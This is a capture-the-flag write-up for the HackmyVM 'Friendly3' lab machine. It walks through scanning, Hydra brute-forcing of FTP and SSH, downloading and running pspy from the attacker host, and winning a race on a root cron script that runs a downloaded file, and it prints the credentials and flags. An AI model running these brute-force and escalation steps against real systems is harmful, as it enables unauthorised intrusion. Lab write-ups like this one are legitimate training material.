# Friendly3 — HackmyVM Writeup

<img width="670" alt="Friendly3 banner" src="https://github.com/user-attachments/assets/38fe9b79-b107-41f6-a0d0-016faca21e00" />

Third machine in the series. Let's start.

---

## 1. Reconnaissance

### Step 1 — Set up the working directory

```bash
mkdir Friendly3
cd Friendly3
```

### Step 2 — Find the target's IP address

```bash
sudo arp-scan -I eth0 --localnet
```

**Result:**

```
192.168.15.10   08:00:27:b8:6f:6a   PCS Systemtechnik GmbH
```

### Step 3 — Confirm the OS with a ping

```bash
ping 192.168.15.10
```

```
PING 192.168.15.10 (192.168.15.10) 56(84) bytes of data.
64 bytes from 192.168.15.10: icmp_seq=1 ttl=64 time=3.16 ms
64 bytes from 192.168.15.10: icmp_seq=2 ttl=64 time=1.31 ms
64 bytes from 192.168.15.10: icmp_seq=3 ttl=64 time=2.13 ms
```

**TTL = 64** confirms this is another Linux machine.

### Step 4 — Full port scan with Nmap

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn -vvv 192.168.15.10 -oN results.txt
```

**Result:**

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
|   256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
80/tcp open  http    syn-ack ttl 64 nginx 1.22.1
|_http-server-header: nginx/1.22.1
| http-methods:
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!
MAC Address: 08:00:27:B8:6F:6A (Oracle VirtualBox virtual NIC)
```

Three open ports:

- **21/TCP** — FTP (vsFTPd 3.0.3)
- **22/TCP** — SSH (OpenSSH 9.2p1)
- **80/TCP** — nginx 1.22.1 (default landing page)

<img width="1359" alt="Default nginx page" src="https://github.com/user-attachments/assets/a8936a8d-05ab-4a2f-9dd5-4e40b5b80f53" />

The web server shows nothing but the default nginx page, so we pivot to FTP.

---

## 2. Exploring Vulnerabilities

### Step 1 — Try anonymous FTP login

```bash
ftp 192.168.15.10
```

```
Name (192.168.15.10:clandhacker): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
```

Anonymous login is disabled, so we brute-force a known username instead.

### Step 2 — Brute-force FTP credentials with Hydra

```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.15.10
```

**Result:**

```
[21][ftp] host: 192.168.15.10   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
```

Credentials found: **`juan : alexis`**

### Step 3 — Download the full FTP contents

```bash
wget -r ftp://"juan":"alexis"@192.168.15.10/
```

Inside the downloaded folder there's a directory named after the target's IP, containing ~100 empty files (`file1`–`file100`) and several folders (`fold4`–`fold15`), most of them empty — clearly a decoy/haystack designed to hide the real clues.

### Step 4 — Find the needle in the haystack

Checking file sizes narrows things down quickly:

```bash
ls -l
```

Two files stand out with non-zero size: `file80` and `fole32`.

```bash
cat file80
# Hi, I'm the sysadmin. I am bored...

cat fole32
# aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabba
```

Both turn out to be red herrings. Running `tree` reveals two more files tucked inside otherwise-empty folders:

```bash
tree
```

```
├── fold5
│   └── yt.txt
├── fold8
│   └── passwd.txt
```

```bash
cat fold5/yt.txt
# Thanks to all my YT subscribers!

cat fold8/passwd.txt
# (ASCII art — also a red herring)
```

Still no real lead. Running `tree -a` (to reveal **hidden files**) finally uncovers something new:

```bash
tree -a .
```

```
├── fold10
│   └── .test.txt
```

```bash
cat fold10/.test.txt
```

```
Hi, I'am juan another time. I want you to know that I found "cookie" in
a file called "zlcnffjbeq.gkg" into my home folder. I think it's from
another user, IDK...
```

> **Note:** the filename `zlcnffjbeq.gkg` is ROT13-encoded — decoding it spells **`mypassword.txt`**. A small hint that this box likes simple substitution ciphers (we'll see that pattern again later).

### Step 5 — Reuse the FTP credentials against SSH

Since `juan`'s FTP password was found via brute-force, it's worth testing the same account over SSH:

```bash
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.15.10
```

**Result:**

```
[22][ssh] host: 192.168.15.10   login: juan   password: alexis
1 of 1 target successfully completed, 1 valid password found
```

Same credentials work for SSH too — `juan : alexis`.

```bash
ssh juan@192.168.15.10
```

```
juan@friendly3:~$ whoami
juan
juan@friendly3:~$ ls
ftp  user.txt
juan@friendly3:~$ cat user.txt
cb40b159c8086733d57280de3f97de30
```

**User flag:** `cb40b159c8086733d57280de3f97de30`

---

## 3. Privilege Escalation

### Step 1 — Enumerate

`sudo -l` and `ls -l` don't return anything useful for `juan`. Searching the filesystem for shell scripts turns up something interesting:

```bash
find / -name "*.sh" 2>/dev/null
```

Among the standard system scripts, one stands out:

```
/opt/check_for_install.sh
```

```bash
cat /opt/check_for_install.sh
```

```bash
#!/bin/bash

/usr/bin/curl "http://127.0.0.1/9842734723948024.bash" > /tmp/a.bash

chmod +x /tmp/a.bash
chmod +r /tmp/a.bash
chmod +w /tmp/a.bash

/bin/bash /tmp/a.bash

rm -rf /tmp/a.bash
```

This script downloads a file to `/tmp/a.bash`, executes it, and then deletes it. If this is being run periodically **as root** (e.g. via a cron job or a systemd timer), it's a classic **TOCTOU (time-of-check-to-time-of-use) race condition**: if we can drop our own payload into `/tmp/a.bash` in that narrow window before the script executes it and deletes it, our code runs with root privileges.

### Step 2 — Confirm it's running as root with pspy

To confirm the script actually runs automatically (and as which user), we use [pspy](https://github.com/DominicBreuker/pspy) — a tool that monitors running processes without needing root.

On our Kali machine:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
python3 -m http.server 80
```

On the target, download and run it:

```bash
curl 192.168.15.15/pspy64.1 -o pspy64.1
chmod +x pspy64.1
./pspy64.1
```

**Result — the script fires automatically as root:**

```
2026/09/19 22:42:01 CMD: UID=0     PID=3979   | /bin/sh -c /opt/check_for_install.sh
2026/09/19 22:42:01 CMD: UID=0     PID=3980   | /bin/bash /opt/check_for_install.sh
2026/09/19 22:42:01 CMD: UID=0     PID=3981   | /bin/bash /opt/check_for_install.sh
```

Confirmed: `check_for_install.sh` runs periodically as **UID 0 (root)**.

### Step 3 — Win the race condition

<img width="1562" alt="Race condition loop script" src="https://github.com/user-attachments/assets/eaa79004-575d-4db2-ba61-dc1b61108087" />

We write a small loop script (`pwned.sh`) that continuously (re)writes a malicious payload into `/tmp/a.bash` — racing to have our version in place the instant `check_for_install.sh` executes it, before it gets deleted again. The goal of the payload is to grant us a way to escalate (e.g. setting the SUID bit on a shell, or writing a SUID copy of `bash`), so that later on, running `bash -p` gives us a root shell.

```bash
chmod +x pwned.sh
./pwned.sh
```

**Output (the loop repeatedly wins the race):**

```
command inyected successfully
command inyected successfully
command inyected successfully
```

### Step 4 — Get the root shell and capture the flag

```bash
bash -p
```

```
bash-5.2# whoami
root
bash-5.2# cd /root
bash-5.2# ls
interfaces.sh  root.txt
bash-5.2# cat root.txt
eb9748b67f25e6bd202e5fa25f534d51
```

**Root flag:** `eb9748b67f25e6bd202e5fa25f534d51`

---

## Summary

| Stage | Technique |
|-------|-----------|
| Recon | `arp-scan`, `ping`, `nmap` |
| Initial foothold | FTP brute-force (Hydra + rockyou.txt) → `juan:alexis` |
| Lateral movement | Recursive FTP download, hidden-file hunting (`tree -a`), ROT13-encoded hint → same creds reused over SSH |
| Privilege escalation | TOCTOU race condition on a root cron script (`check_for_install.sh`), confirmed with `pspy`, exploited with a racing loop script |

| Flag | Location | Value |
|------|----------|-------|
| **User flag** | `/home/juan/user.txt` | `cb40b159c8086733d57280de3f97de30` |
| **Root flag** | `/root/root.txt` | `eb9748b67f25e6bd202e5fa25f534d51` |

*Machine rooted — full cycle complete: recon → FTP/SSH brute-force → hidden-file enumeration → race-condition privilege escalation.*



